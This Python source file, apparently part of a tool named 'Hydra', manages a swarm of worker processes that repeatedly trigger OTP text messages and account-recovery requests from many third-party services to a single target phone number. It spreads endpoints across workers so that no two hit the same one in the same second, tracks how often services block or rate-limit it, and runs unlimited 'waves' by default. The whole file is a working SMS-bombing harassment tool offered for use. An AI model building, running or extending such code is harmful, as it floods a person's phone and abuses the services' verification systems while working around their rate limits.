"""
╔══════════════════════════════════════════════════════════════╗
║   HYDRA SWARM MANAGER  —  Phase 5                           ║
║                                                              ║
║  Spawns N parallel Hydra worker processes, each handling a  ║
║  subset of targets. Coordinates to avoid duplicate target   ║
║  collisions per second. Aggregates stats from all workers.  ║
║  Resource Governor throttles thread count if CPU > 70%.     ║
║                                                              ║
║  Usage:                                                      ║
║    python hydra_swarm_manager.py --phone 9876543210          ║
║    python hydra_swarm_manager.py --phone 9876543210 -n 4     ║
║    python hydra_swarm_manager.py --phone 9876543210 --waves 5║
║                                                              ║
║  Architecture:                                               ║
║    Manager ──▶ WorkerProcess × N (separate Python processes) ║
║            ◀── stats via multiprocessing.Queue              ║
║    Manager ──▶ HTTP REST for hydra_server.py swarm routes   ║
╚══════════════════════════════════════════════════════════════╝
"""

import argparse
import json
import math
import multiprocessing
import os
import signal
import sys
import time
import threading

# ── Optional psutil for Phase 5.4 Resource Governor ──────────
try:
    import psutil
    _PSUTIL = True
except ImportError:
    _PSUTIL = False

# ── ANSI colours ─────────────────────────────────────────────
RESET  = "\033[0m"
GREEN  = "\033[92m"
CYAN   = "\033[96m"
YELLOW = "\033[93m"
RED    = "\033[91m"
DIM    = "\033[2m"
BOLD   = "\033[1m"
PURPLE = "\033[95m"

# ── Constants ─────────────────────────────────────────────────
DEFAULT_WORKERS      = 3
WORKER_STAGGER_S     = 0.5      # 5.2 — stagger worker start times
CPU_THROTTLE_THRESH  = 70.0     # 5.4 — throttle if CPU % exceeds this
CPU_CHECK_INTERVAL   = 5.0      # seconds between CPU checks
STAT_INTERVAL        = 1.0      # seconds between stat aggregation prints

# ─────────────────────────────────────────────────────────────
#  PHASE 5.1 — WORKER PROCESS
#  Each worker runs hydra_v4 in its own process with a subset
#  of targets. Stats are pushed to a shared multiprocessing Queue.
# ─────────────────────────────────────────────────────────────

def _worker_process(
    worker_id:    int,
    phone:        str,
    target_slice: list,
    stagger:      float,
    max_waves:    int,
    dual_vector:  bool,
    stats_queue:  multiprocessing.Queue,
    stop_event:   multiprocessing.Event,
):
    """
    Runs as a separate OS process.
    Fires hydra_v4.run_wave() over target_slice in a loop.
    Reports stats back via stats_queue.
    """
    # Local imports inside process to avoid shared state issues
    try:
        from hydra_v4 import run_wave, STOP as _HYDRA_STOP, RECOVERY_TARGETS
    except Exception as e:
        stats_queue.put({"worker": worker_id, "error": str(e), "done": True})
        return

    # Wire the stop event into hydra's cooperative STOP flag
    def _watch_stop():
        while not stop_event.is_set():
            time.sleep(0.2)
        _HYDRA_STOP.set()
    watcher = threading.Thread(target=_watch_stop, daemon=True)
    watcher.start()

    wave_num    = 0
    sent        = 0
    blocked     = 0
    ratelimited = 0
    fake200     = 0

    def _on_result(r: dict):
        nonlocal sent, blocked, ratelimited, fake200
        v = r.get("verdict", "")
        if v == "OTP_SENT":
            sent += 1
        elif v == "BLOCKED":
            blocked += 1
        elif v == "RATE_LIMITED":
            ratelimited += 1
        elif v == "FAKE_200":
            fake200 += 1

    try:
        while not stop_event.is_set() and not _HYDRA_STOP.is_set():
            if max_waves > 0 and wave_num >= max_waves:
                break

            wave_num += 1
            results = run_wave(
                phone        = phone,
                targets      = target_slice,
                wave_num     = wave_num,
                debug        = False,
                stagger      = stagger,
                log_fn       = _on_result,
                dual_vector  = dual_vector,
            )

            # Push stats snapshot to manager
            stats_queue.put({
                "worker":      worker_id,
                "wave":        wave_num,
                "sent":        sent,
                "blocked":     blocked,
                "ratelimited": ratelimited,
                "fake200":     fake200,
                "targets":     len(target_slice),
                "done":        False,
            })

            if stop_event.is_set() or _HYDRA_STOP.is_set():
                break

    except Exception as e:
        stats_queue.put({"worker": worker_id, "error": str(e), "done": True})
        return

    stats_queue.put({
        "worker":  worker_id,
        "wave":    wave_num,
        "sent":    sent,
        "blocked": blocked,
        "done":    True,
    })


# ─────────────────────────────────────────────────────────────
#  PHASE 5.2 — WAVE COORDINATOR
#  Partitions the target list across N workers so no two
#  workers fire the same endpoint in the same second.
# ─────────────────────────────────────────────────────────────

def partition_targets(targets: list, n_workers: int) -> list[list]:
    """
    Split targets into n_workers non-overlapping slices.
    Ensures each target is assigned to exactly one worker.
    """
    if not targets:
        return [[] for _ in range(n_workers)]

    size  = math.ceil(len(targets) / n_workers)
    slices = []
    for i in range(n_workers):
        slices.append(targets[i * size : (i + 1) * size])
    # Pad empty if targets < n_workers
    while len(slices) < n_workers:
        slices.append([])
    return slices


# ─────────────────────────────────────────────────────────────
#  PHASE 5.4 — RESOURCE GOVERNOR
#  Monitors CPU / RAM and signals throttle if CPU > 70%
# ─────────────────────────────────────────────────────────────

class ResourceGovernor:
    """
    Background thread — monitors CPU and RAM.
    Sets throttle_event if CPU > CPU_THROTTLE_THRESH for 2+ consecutive checks.
    Clears it once CPU drops below threshold.
    """

    def __init__(self):
        self.throttle_event = threading.Event()
        self._stop          = threading.Event()
        self._thread        = threading.Thread(target=self._loop, daemon=True)
        self._consecutive   = 0
        self.last_cpu       = 0.0
        self.last_ram       = 0.0

    def start(self):
        self._thread.start()

    def stop(self):
        self._stop.set()

    def _loop(self):
        while not self._stop.is_set():
            if _PSUTIL:
                self.last_cpu = psutil.cpu_percent(interval=None)
                self.last_ram = psutil.virtual_memory().percent
            else:
                # Fallback: use os.getloadavg on Linux/Mac; skip on Windows
                try:
                    load = os.getloadavg()[0] if hasattr(os, "getloadavg") else 0.0
                    cpu_count = os.cpu_count() or 1
                    self.last_cpu = min((load / cpu_count) * 100, 100.0)
                except Exception:
                    self.last_cpu = 0.0
                self.last_ram = 0.0

            if self.last_cpu > CPU_THROTTLE_THRESH:
                self._consecutive += 1
                if self._consecutive >= 2 and not self.throttle_event.is_set():
                    self.throttle_event.set()
                    print(f"\n{YELLOW}[GOV] CPU {self.last_cpu:.0f}% > {CPU_THROTTLE_THRESH:.0f}% — THROTTLE ENGAGED{RESET}")
            else:
                if self.last_cpu < CPU_THROTTLE_THRESH * 0.75:
                    self._consecutive = 0
                    if self.throttle_event.is_set():
                        self.throttle_event.clear()
                        print(f"\n{GREEN}[GOV] CPU {self.last_cpu:.0f}% — THROTTLE RELEASED{RESET}")

            self._stop.wait(timeout=CPU_CHECK_INTERVAL)


# ─────────────────────────────────────────────────────────────
#  PHASE 5.1 — SWARM MANAGER
# ─────────────────────────────────────────────────────────────

class SwarmManager:
    """
    Orchestrates N worker processes across a partitioned target set.
    Aggregates their stats and prints a live unified dashboard.
    """

    def __init__(
        self,
        phone:       str,
        n_workers:   int   = DEFAULT_WORKERS,
        stagger:     float = 0.3,
        max_waves:   int   = 0,
        dual_vector: bool  = False,
        verbose:     bool  = True,
    ):
        self.phone       = phone
        self.n_workers   = n_workers
        self.stagger     = stagger
        self.max_waves   = max_waves
        self.dual_vector = dual_vector
        self.verbose     = verbose

        self._stop_event  = multiprocessing.Event()
        self._stats_queue = multiprocessing.Queue()
        self._governor    = ResourceGovernor()

        # Per-worker live stats
        self._worker_stats: dict[int, dict] = {
            i: {"wave": 0, "sent": 0, "blocked": 0, "ratelimited": 0, "fake200": 0, "done": False, "targets": 0, "error": None}
            for i in range(n_workers)
        }
        self._processes: list[multiprocessing.Process] = []
        self._start_time: float = 0.0

    def _load_targets(self) -> list:
        """Import targets from hydra_v4, run autosync + liveness check."""
        try:
            from hydra_v4 import TARGETS, liveness_check, _AUTOSYNC_AVAILABLE, _load_platform_profiles
        except Exception as e:
            print(f"{RED}[ERR] Cannot import hydra_v4: {e}{RESET}")
            sys.exit(1)

        _load_platform_profiles()

        try:
            if _AUTOSYNC_AVAILABLE:
                from hydra_autosync import build_dynamic_targets
                targets = build_dynamic_targets(list(TARGETS), verbose=self.verbose)
            else:
                targets = list(TARGETS)
        except Exception:
            targets = list(TARGETS)

        if self.verbose:
            print(f"{DIM}[SWARM] Running liveness check on {len(targets)} targets...{RESET}")
        targets = liveness_check(targets, verbose=False)
        if self.verbose:
            print(f"{GREEN}[SWARM] {len(targets)} live targets ready{RESET}")
        return targets

    def _print_banner(self, n_targets: int):
        print(f"\n{GREEN}{'═'*62}{RESET}")
        print(f"{BOLD}{GREEN}  HYDRA SWARM MANAGER  v5.0{RESET}")
        print(f"{GREEN}{'═'*62}{RESET}")
        print(f"  Target  : {CYAN}+91 {self.phone}{RESET}")
        print(f"  Workers : {CYAN}{self.n_workers}{RESET}")
        print(f"  Targets : {CYAN}{n_targets} live (partitioned){RESET}")
        print(f"  Stagger : {CYAN}{self.stagger}s{RESET}")
        print(f"  Waves   : {CYAN}{'∞' if self.max_waves == 0 else self.max_waves}{RESET}")
        print(f"  Mode    : {CYAN}{'DUAL-VECTOR + SWARM' if self.dual_vector else 'SWARM'}{RESET}")
        if _PSUTIL:
            print(f"  Gov     : {GREEN}ACTIVE (psutil){RESET}")
        else:
            print(f"  Gov     : {YELLOW}PASSIVE (install psutil for full CPU monitoring){RESET}")
        print(f"{GREEN}{'═'*62}{RESET}\n")

    def _print_swarm_status(self):
        """Print one-line per-worker status + totals."""
        total_sent  = sum(s["sent"]        for s in self._worker_stats.values())
        total_block = sum(s["blocked"]      for s in self._worker_stats.values())
        total_rl    = sum(s["ratelimited"]  for s in self._worker_stats.values())
        total_fake  = sum(s["fake200"]      for s in self._worker_stats.values())
        max_wave    = max((s["wave"] for s in self._worker_stats.values()), default=0)
        elapsed     = time.time() - self._start_time

        # CPU/RAM
        gov_str = ""
        if _PSUTIL:
            cpu = self._governor.last_cpu
            ram = self._governor.last_ram
            gov_str = f"  CPU:{cpu:.0f}%  RAM:{ram:.0f}%"
            if self._governor.throttle_event.is_set():
                gov_str += f"  {YELLOW}[THROTTLED]{RESET}"

        print(f"\r{' '*100}\r", end="")  # clear line
        print(f"{DIM}t={elapsed:.0f}s{RESET}  Wave:{CYAN}{max_wave}{RESET}  "
              f"OTP:{GREEN}{total_sent}{RESET}  "
              f"Blk:{RED}{total_block}{RESET}  "
              f"RL:{YELLOW}{total_rl}{RESET}  "
              f"F200:{PURPLE}{total_fake}{RESET}"
              f"{gov_str}", end="", flush=True)

    def _drain_queue(self):
        """Pull all available items from stats_queue without blocking."""
        while True:
            try:
                item = self._stats_queue.get_nowait()
                wid  = item["worker"]
                if "error" in item:
                    self._worker_stats[wid]["error"] = item["error"]
                    self._worker_stats[wid]["done"]  = True
                    if self.verbose:
                        print(f"\n{RED}[WORKER-{wid}] ERROR: {item['error']}{RESET}")
                else:
                    self._worker_stats[wid].update(item)
            except Exception:
                break

    def run(self):
        """Main entry point — launches workers, aggregates, prints dashboard."""
        # ── Signal handlers ─────────────────────────────────
        def _handle_sig(sig, frame):
            print(f"\n\n{YELLOW}[SWARM] STOP signal received — graceful shutdown...{RESET}")
            self._stop_event.set()

        signal.signal(signal.SIGINT,  _handle_sig)
        signal.signal(signal.SIGTERM, _handle_sig)

        # ── Load + partition targets ─────────────────────────
        targets = self._load_targets()
        if not targets:
            print(f"{RED}[ERR] No live targets. Abort.{RESET}")
            return

        slices = partition_targets(targets, self.n_workers)
        self._print_banner(len(targets))

        # ── Start Resource Governor ──────────────────────────
        self._governor.start()

        # ── Spawn worker processes ───────────────────────────
        self._start_time = time.time()
        for i in range(self.n_workers):
            self._worker_stats[i]["targets"] = len(slices[i])
            p = multiprocessing.Process(
                target   = _worker_process,
                args     = (
                    i,
                    self.phone,
                    slices[i],
                    self.stagger,
                    self.max_waves,
                    self.dual_vector,
                    self._stats_queue,
                    self._stop_event,
                ),
                daemon   = True,
                name     = f"HydraWorker-{i}",
            )
            p.start()
            self._processes.append(p)
            if self.verbose:
                print(f"{GREEN}[SWARM] WORKER-{i} started  PID={p.pid}  targets={len(slices[i])}{RESET}")
            # 5.2 — stagger start times
            if i < self.n_workers - 1:
                time.sleep(WORKER_STAGGER_S)

        print("")

        # ── Aggregate loop ───────────────────────────────────
        try:
            while True:
                self._drain_queue()
                self._print_swarm_status()

                # Check if governor throttle is active → reduce stagger
                if self._governor.throttle_event.is_set():
                    # Signal workers indirectly via stop+restart is complex;
                    # instead we just note it and let existing waves finish slower
                    pass

                # Check if all workers done
                all_done = all(s["done"] for s in self._worker_stats.values())
                if all_done or self._stop_event.is_set():
                    break

                time.sleep(STAT_INTERVAL)

        finally:
            self._stop_event.set()
            self._governor.stop()
            for p in self._processes:
                p.join(timeout=12)
                if p.is_alive():
                    p.kill()

            # Final stats
            self._drain_queue()
            self._print_final_summary(len(targets))

    def _print_final_summary(self, total_targets: int):
        """Print final swarm summary after all workers finish."""
        elapsed     = time.time() - self._start_time
        total_sent  = sum(s["sent"]       for s in self._worker_stats.values())
        total_block = sum(s["blocked"]    for s in self._worker_stats.values())
        total_rl    = sum(s["ratelimited"]for s in self._worker_stats.values())
        total_fake  = sum(s["fake200"]    for s in self._worker_stats.values())
        total_wave  = max((s["wave"] for s in self._worker_stats.values()), default=0)
        total_req   = total_sent + total_block + total_rl + total_fake

        print(f"\n\n{GREEN}{'═'*62}{RESET}")
        print(f"{BOLD}{GREEN}  SWARM SUMMARY{RESET}")
        print(f"{GREEN}{'═'*62}{RESET}")
        print(f"  Duration     : {elapsed:.1f}s")
        print(f"  Workers      : {self.n_workers}")
        print(f"  Targets Live : {total_targets}")
        print(f"  Max Wave     : {total_wave}")
        print(f"  Total Reqs   : {total_req}")
        print(f"  OTP Sent     : {GREEN}{total_sent}{RESET}")
        print(f"  Blocked      : {RED}{total_block}{RESET}")
        print(f"  Rate Limited : {YELLOW}{total_rl}{RESET}")
        print(f"  Fake 200     : {PURPLE}{total_fake}{RESET}")
        print(f"\n  Per-Worker breakdown:")
        for wid, s in self._worker_stats.items():
            status = f"{RED}ERROR: {s['error']}{RESET}" if s["error"] else f"Wave {s['wave']}  OTP:{GREEN}{s['sent']}{RESET}  Blk:{RED}{s['blocked']}{RESET}"
            print(f"    WORKER-{wid} [{s['targets']} targets]  {status}")
        print(f"{GREEN}{'═'*62}{RESET}\n")

        # Auto-save session to JSON
        report = {
            "phone":        self.phone,
            "workers":      self.n_workers,
            "targets":      total_targets,
            "elapsed_s":    round(elapsed, 1),
            "max_wave":     total_wave,
            "total_requests": total_req,
            "otp_sent":     total_sent,
            "blocked":      total_block,
            "rate_limited": total_rl,
            "fake200":      total_fake,
            "worker_detail": {
                str(wid): {"wave": s["wave"], "sent": s["sent"], "blocked": s["blocked"],
                            "targets": s["targets"], "error": s["error"]}
                for wid, s in self._worker_stats.items()
            },
        }
        import datetime
        ts        = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        log_dir   = os.path.join(os.path.dirname(os.path.abspath(__file__)), "hydra_logs")
        os.makedirs(log_dir, exist_ok=True)
        log_path  = os.path.join(log_dir, f"swarm_{ts}.json")
        with open(log_path, "w", encoding="utf-8") as f:
            json.dump(report, f, indent=2)
        print(f"{DIM}[SWARM] Session saved → {log_path}{RESET}\n")


# ─────────────────────────────────────────────────────────────
#  SWARM STATUS API  (Phase 5.3 — for hydra_server.py routes)
# ─────────────────────────────────────────────────────────────

# Exported state — populated when swarm is launched via server
_swarm_state: dict = {
    "running":   False,
    "workers":   0,
    "phone":     "",
    "wave":      0,
    "sent":      0,
    "blocked":   0,
    "ratelimited": 0,
    "fake200":   0,
    "targets":   0,
    "worker_detail": {},
}

def get_swarm_state() -> dict:
    """Return a copy of the current swarm state (for Flask API)."""
    return dict(_swarm_state)


# ─────────────────────────────────────────────────────────────
#  CLI ENTRY POINT
# ─────────────────────────────────────────────────────────────

def _parse_args():
    p = argparse.ArgumentParser(
        description = "HYDRA Swarm Manager — Phase 5",
        formatter_class = argparse.RawTextHelpFormatter,
    )
    p.add_argument("--phone",   "-p",  required=True,       help="10-digit target number (no country code)")
    p.add_argument("--workers", "-n",  type=int,  default=DEFAULT_WORKERS, help=f"Number of parallel workers (default {DEFAULT_WORKERS})")
    p.add_argument("--stagger", "-s",  type=float,default=0.3,   help="Per-request stagger seconds (default 0.3)")
    p.add_argument("--waves",   "-w",  type=int,  default=0,     help="Max waves per worker (0 = unlimited)")
    p.add_argument("--dual",    "-d",  action="store_true",      help="Enable DUAL-VECTOR mode (SMS + Recovery)")
    p.add_argument("--quiet",   "-q",  action="store_true",      help="Suppress verbose output")
    return p.parse_args()


if __name__ == "__main__":
    # Windows multiprocessing safety
    multiprocessing.freeze_support()

    args = _parse_args()

    # Validate phone
    phone = args.phone.strip()
    if phone.startswith("91") and len(phone) == 12:
        phone = phone[2:]
    if len(phone) != 10 or not phone.isdigit():
        print(f"{RED}[ERR] Phone must be a 10-digit number. Got: {phone}{RESET}")
        sys.exit(1)

    mgr = SwarmManager(
        phone       = phone,
        n_workers   = max(1, min(args.workers, 10)),   # cap at 10 workers
        stagger     = max(0.05, args.stagger),
        max_waves   = max(0, args.waves),
        dual_vector = args.dual,
        verbose     = not args.quiet,
    )
    mgr.run()
